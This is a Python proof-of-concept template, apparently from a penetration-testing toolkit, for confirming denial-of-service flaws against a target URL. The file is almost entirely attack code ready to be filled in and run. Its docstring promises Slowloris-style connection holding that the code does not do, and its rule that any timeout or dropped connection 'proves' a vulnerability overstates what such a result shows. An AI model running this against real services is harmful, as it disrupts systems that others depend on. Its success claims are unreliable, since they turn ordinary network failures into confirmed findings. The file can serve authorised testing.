"""
ZeroKit DoS / Availability PoC Template — Connection Exhaustion / Slowloris
============================================================================
Use this template for: Connection Exhaustion, Slowloris-style attacks,
or any DoS where you hold open a long-lived connection.

For ReDoS / JSON-depth / Pagination abuse use: http_dos_algorithmic.py

⚠️  PAYLOAD SIZE RULE — HARD LIMIT 50 KB ⚠️
  Modern frameworks (Kestrel, Spring Boot, Express) reject bodies > their
  configured limit at the PROTOCOL LAYER before application code runs.
  Actions taken there (TCP Reset / HTTP 413) do NOT prove a vulnerability.
  If your DATA value is > 50 KB, switch to http_dos_algorithmic.py instead.

This template treats a network Timeout/ConnectionError as EXPLOIT SUCCESS (exit 0).
A server that hangs and does not respond IS proof of the vulnerability.

Variables to fill:
    TARGET_URL  - The endpoint that processes the malicious payload.
    PAYLOAD     - The DoS-triggering input (< 50 KB). For algorithmic payloads use the
                  http_dos_algorithmic.py template.
    METHOD      - "GET" | "POST" | "PUT"
    DATA        - dict / bytes to send as request body (POST/PUT only). Set None for GET.
    HEADERS     - dict of extra HTTP headers.
    DOS_TIMEOUT - Seconds to wait before declaring DoS success. Default: 10.
"""

import requests
import sys
import time

# ── Configuration ────────────────────────────────────────────────────────────
TARGET_URL  = "{{TARGET_URL}}"
PAYLOAD     = "{{PAYLOAD}}"
METHOD      = "POST"                     # "GET" | "POST" | "PUT"
DATA        = {"input": PAYLOAD}         # Change to None if GET
HEADERS     = {"Content-Type": "application/x-www-form-urlencoded"}
DOS_TIMEOUT = 10                         # seconds


# ── Baseline check ───────────────────────────────────────────────────────────
def baseline_ok() -> bool:
    """Confirm the server is alive before sending the payload."""
    try:
        r = requests.get(TARGET_URL, timeout=DOS_TIMEOUT, headers=HEADERS)
        print(f"[*] Baseline OK — status {r.status_code}, {time.monotonic():.1f}s")
        return True
    except requests.exceptions.Timeout:
        print("[!] Baseline already timed out — server may already be down.")
        return False
    except Exception as e:
        print(f"[!] Baseline request failed: {e}")
        return False


# ── DoS attack ───────────────────────────────────────────────────────────────
def test_dos() -> bool:
    """
    Send the malicious payload and treat a Timeout as EXPLOIT SUCCESS.

    Return True  → DoS confirmed → caller will exit(0)
    Return False → No observable impact  → caller will exit(1)
    """
    print(f"[*] Sending DoS payload to {TARGET_URL}")
    t_start = time.monotonic()
    try:
        if METHOD.upper() == "GET":
            requests.get(TARGET_URL, params={"q": PAYLOAD},
                         timeout=DOS_TIMEOUT, headers=HEADERS)
        else:
            requests.request(METHOD, TARGET_URL, data=DATA,
                             timeout=DOS_TIMEOUT, headers=HEADERS)

        elapsed = time.monotonic() - t_start
        print(f"[-] Server responded normally in {elapsed:.2f}s — DoS not triggered.")
        return False

    except requests.exceptions.Timeout:
        elapsed = time.monotonic() - t_start
        # ===================================================================
        # KEY RULE: Timeout == SUCCESS for DoS hypothesis.
        # The server did not respond within DOS_TIMEOUT seconds, which proves
        # the payload has exhausted server resources (CPU/memory/connections).
        # ===================================================================
        print(f"[+] DoS SUCCESS: server did not respond within {elapsed:.1f}s")
        print("[+] Resource exhaustion / availability impact CONFIRMED.")
        return True

    except requests.exceptions.ConnectionError as e:
        elapsed = time.monotonic() - t_start
        # Connection reset / refused mid-flight also indicates crash/OOM.
        print(f"[+] DoS SUCCESS (connection dropped after {elapsed:.1f}s): {e}")
        print("[+] Server crash or process kill CONFIRMED.")
        return True

    except Exception as e:
        print(f"[-] Unexpected error (inconclusive): {e}")
        return False


# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    if not baseline_ok():
        print("[-] Aborting: server not reachable on baseline — cannot prove DoS.")
        sys.exit(2)   # exit(2) = inconclusive / server already down

    if test_dos():
        sys.exit(0)   # confirmed
    sys.exit(1)       # rejected
